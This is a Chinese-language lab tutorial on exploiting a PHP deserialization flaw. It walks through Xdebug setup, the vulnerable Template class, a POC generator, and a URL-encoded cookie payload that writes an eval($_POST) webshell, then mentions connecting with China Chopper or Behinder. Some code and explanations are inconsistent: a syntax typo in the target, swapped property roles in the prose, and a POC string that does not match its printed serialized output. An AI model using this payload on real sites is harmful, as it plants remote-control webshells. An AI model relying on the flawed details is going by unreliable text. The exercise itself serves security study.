[TOC]



# ==PHP反序列化练习讲解==

## 一、PHP远程调试安装配置

### 1、安装VSCode插件

无论远程还是本地调试，都需要在VSCode中安装PHP Debug插件，顺便也把智能提示安装在远程，实现智能提示

xampp5.6建议安装xdebug2.5.5

将xdebug2.5.5解压

```
unzip xdebug-master.zip 
```

### 2、配置

```
cd xdebug-master
/opt/lampp/bin/phpize
```

如果出现

```
Cannot find autoconf. Please check your autoconf installation and the
$PHP_AUTOCONF environment variable. Then, rerun this script.
```

则

```
yum install autoconf
```

然后重新 `/opt/lampp/bin/phpize`

接下来

```
./configure --enable-xdebug --with-php-config=/opt/lampp/bin/php-config
make
make install
```

取得扩展文件xdebug.so的路径

```
Installing shared extensions:     /opt/lampp/lib/php/extensions/no-debug-non-zts-20131226/
```

修改 /opt/lampp/etc/php.ini 在Module Settings 节点下添加

```
[XDebug]
zend_extension=/opt/lampp/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so
xdebug.remote_enable = 1		; 开启远程调试功能
xdebug.remote_autostart = 1	     ; 自动启动
xdebug.remote_handler = "dbgp"	 ; 调试处理器
xdebug.remote_port = "9003"		 ; 端口号
xdebug.remote_host = "192.168.230.188"	; 远程调试的IP地址，即PHP所在服务器IP
```

配置VSCode中的XDebug，确保端口一致

![image-20240827000931337](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827000931337.png)

![image-20240827000900645](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827000900645.png)



## 二、目标代码分析

```php
<?php

class Template{
    var $cacheFile = "cache.txt";
    var $template = "<div>Welcome back %s</div>";

    function __construct($data = null) {
        $data = $this->loadData($data);
        $this->render($data);
    }

    function loadData($data) {
        return unserialize($data);  // 
        return [];
    }

    function createCache($file = null,$tpl = null) {
        $file = $file ?: $this->cacheFile;
        $tpl = $tpl ?; $this->template;
        file_put_contents($file,$tpl);
    }

    function render($data) {
        echo sprintf($this->template,htmlspecialchars($data['name']));
    }

    function __destruct() {
        $this->createCache();
    }

}

new Template($_COOKIE['data']);

?>
```

### 实现对以上代码的Payload构造，并实现写入木马的功能

- 看运行的代码（即函数之外的代码，类似于C语言中的main函数中的内容），这里是 `new Template($_COOKIE['data']);` 直接实例化一个Template对象，与之前的直接 unserialize() 不一样

- 由于此处是直接实例化对象，所以首先运行的是 `__construct()` 函数，并且 `$data` 赋值为 `$_COOKIE['data']` 
- `__construct()` 函数首先调用 `loadData ` 函数  ，该函数就会对 `$data` 中的序列化值进行反序列化，序列化值后返回，此时 `return [];` 这段代码是不会执行的，一个函数中 return 之后的代码都不会执行，从语法上就是错误的
- `return unserialize($data);` 之后就又回到了 `__construct()` 函数 下一步进行 `$this->render($data);` 
- 按照之前的思路，序列化的 `$data` 值经过反序列化之后应该是一个类的实例，但是这种情况放在这里的话就是错的，因为类的实例是无法通过数组的方式取值的 `$data['name']` 所以这一步代码就会报错，从而代码停止执行，那么后面的代码也就别想再运行了



- 但是我们的终点在 `file_put_contents($file,$tpl);` 这句代码，并且 `$file` 需要是木马，而这句代码在 `createCache` 函数中调用，而 `createCache` 函数又被 `__destruct()` 所调用，所以无论如何，应该要让我们构造的序列化值经过反序列化可以运行到 `__destruct()` 函数

- 所以需要让构造的序列值原本是一个数组，数组中是一个Template的实例，然后序列化通过`$_COOKIE['data']`传值给`$data` 

- 此时 render 函数调用结束，则 `__construct()` 函数调用结束，接下来才可以进入 `__destruct()` 函数，从而调用 `createCache`

- `$file = $file ?: $this->cacheFile;` 的意思是，如果 `$file` 不是空（表示真），则 `$file = $file;` 否则 `$file` 是空（表示假），此时 `$file = $this->cacheFile;`

- 又因为此时的`createCache`函数参数中默认 `$file` 就是空，所以 `$file = $this->cacheFile;` 又因为反序列化时，我们构造 `$this->cacheFile` 为`<?php @eval($_POST['code']);?>` 

- 同理可得 构造 `$this->template` 为 可写的目录，例如 `../temp/unserializeshell.php` 

- 再通过 `file_put_contents` 就可以将木马写入 `../temp/unserializeshell.php` 文件中

- 其中 `createCache` 函数一共会执行两次，第一次是反序列化的数组中的实例在调用

- 第二次是new的对象在调用

   

### 使用VSCode调试代码（过调试截图有跳跃）

VSCode调试这里直接到unserialize这一步

![image-20240827182319047](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827182319047.png)

unserialize执行之后直接就回到了__construct

![image-20240827182347187](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827182347187.png)

然后调用render函数，该函数调用完之后，就会从`__construct` 到 `__destruct`，去就是执行 createCache 函数，此时第一次执行的 `__destruct` 是反序列化的实例在执行

![image-20240827182530120](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827182530120.png)

然后此次`__destruct`函数执行结束之后就会立刻再执行一次 `__destruct` 此时是由 new 的Template实例在执行 `__destruct` 

![image-20240827182745836](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827182745836.png)

![image-20240827182753184](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827182753184.png)



## 三、POC生成

```php
<?php
class Template{
    var $cacheFile = "temp/unserializeshell.php";
    var $template = '<?php @eval($_POST["code"])';

}
$a = new Template();
$b = array($a);  // 需要将实例数组化的原因是为了执行render函数时可以不会报错导致后面代码无法执行，因为只有数组才可以用中括号取值
echo urlencode(serialize($b));
  
?>
```

> 如果不将实例数组化，就会因为致命错误导致后面代码无法执行，则木马也就根本无法写入
>
> ```
> O:8:"Template":2:{s:9:"cacheFile";s:25:"temp/unserializeshell.php";s:8:"template";s:30:"<?php @eval($_POST["code"]);?>";}
> ```
>
> 这是没有数组化的实例序列化后的值
>
> ![image-20240827184030340](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827184030340.png)
>
> 我们发送给漏洞页面看看
>
> ![image-20240827184205543](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827184205543.png)
>
> 报错报的是致命错误
>
> 而使用数组化后的序列值出现的问题就是Notice注意，并且有Welcome back输出
>
> ![image-20240827184144258](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827184144258.png)

访问 http://192.168.230.188/unserializevul/unserializePOC.php 获得POC，然后构造Cookie

> 如果不采用URL编码形式的话，构造的POC会因显示问题 `<>` 内的东西都会不显示
>
> ![image-20240827183435847](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827183435847.png)
>
> ![image-20240827183455194](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827183455194.png)
>
> 当然，如果使用源代码中的内容也是可以的，当然，最好的还是使用URL编码，因为即使是URL编码在发送数据之后也会被浏览器解析

```
Cookie:data=a%3A1%3A%7Bi%3A0%3BO%3A8%3A%22Template%22%3A2%3A%7Bs%3A9%3A%22cacheFile%22%3Bs%3A25%3A%22temp%2Funserializeshell.php%22%3Bs%3A8%3A%22template%22%3Bs%3A30%3A%22%3C%3Fphp+%40eval%28%24_POST%5B%22code%22%5D%29%3B%3F%3E%22%3B%7D%7D
```

访问 http://192.168.230.188/unserializevul/unserializevultest_01.php

![image-20240827002333446](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827002333446.png)

此时木马已被写入

## 四、木马利用

![image-20240827184633920](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240827184633920.png)

之后就可以菜刀或冰蝎链接